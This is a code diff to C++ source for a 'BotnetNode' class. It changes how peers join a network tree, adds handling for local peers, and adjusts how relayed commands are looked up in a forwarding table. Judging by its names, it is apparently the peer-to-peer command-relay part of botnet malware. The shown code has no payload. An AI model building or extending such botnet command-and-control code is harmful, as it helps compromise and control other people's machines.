@@ -30,7 +30,7 @@ void BotnetNode::sendNetTree(
 	adr* branches_data = (adr*)(buf + BOTNET_PACK_SIZE + sizeof(tree_ext));
 
 	/* fill the packet with data*/
-	default_pack->type = NETWORK_SYNC;
+	default_pack->type = NETWORK_SYNC_REPLY;
 	extention->host = _adr;
 	extention->n_branches = _branches.size();
 	for (BotnetNode* node : _branches)
@@ -51,21 +51,31 @@ void BotnetNode::sendNetTree(
 }
 
 struct sockaddr_in BotnetNode::addPeer(
-	const u_char* data,
-	BOOL* status
+	struct botnet_pack* const pack,
+	const struct sockaddr_in private_addr,
+	BOOL* const status
 )
 {
 	/* locals */
 	struct sockaddr_in peer_addr;
 	std::vector<adr> hosts;
-	const struct botnet_pack* pack = (struct botnet_pack*)data;
+	//const struct botnet_pack* pack = ;
 
 	/* 0ing peer_addr struct */
 	ZeroMemory(&peer_addr, sizeof(peer_addr));
 	*status = 0;
+	
+	/* check if local peer */
+	if (pack->dst_peer.ip + pack->dst_peer.port == 0)
+	{
+		/* add to tree */
+		_branches.push_back(new BotnetNode(private_addr.sin_addr.s_addr, private_addr.sin_port));
+		pack->private_peer.ip == 0 ? *status = 1 : *status = 2; // successful local (reply back if 1).
+		return private_addr;
+	}
 
 	/* if peer is not in the network tree */
-	if (!findNode({ pack->dst_peer.ip, pack->dst_peer.port }, hosts))
+	if (!findNode({ pack->dst_peer.ip, pack->dst_peer.port }, hosts)) 
 	{
 		/* create addr struct for peer (for direct communication) */
 		peer_addr.sin_family = AF_INET;
@@ -75,7 +85,7 @@ struct sockaddr_in BotnetNode::addPeer(
 		/* add to tree */
 		_branches.push_back(new BotnetNode(pack->dst_peer.ip, pack->dst_peer.port));
 		
-		*status = 1; // successful
+		*status = 2; // successful remote
 	}
 
 	return peer_addr;
@@ -248,12 +258,12 @@ struct sockaddr_in BotnetNode::nextPathNode(
 }
 
 adr BotnetNode::retrieveCommand(
-	u_char* const data
+	struct botnet_pack* const command_res
 )
 {
-	struct botnet_pack* const command_res = (struct botnet_pack*)data;
 	std::map<uint16_t, command_fowarding>::iterator it = _nevigation_table.find(command_res->numerics.id);
 
+	/* check if the command exists in the mapping table */
 	if (it != _nevigation_table.end())
 	{
 		command_fowarding retrived_command = _nevigation_table[command_res->numerics.id];
@@ -264,6 +274,6 @@ adr BotnetNode::retrieveCommand(
 
 		return retrived_command.src_addr;
 	}
-
+	
 	return { 0, 0 };
 }
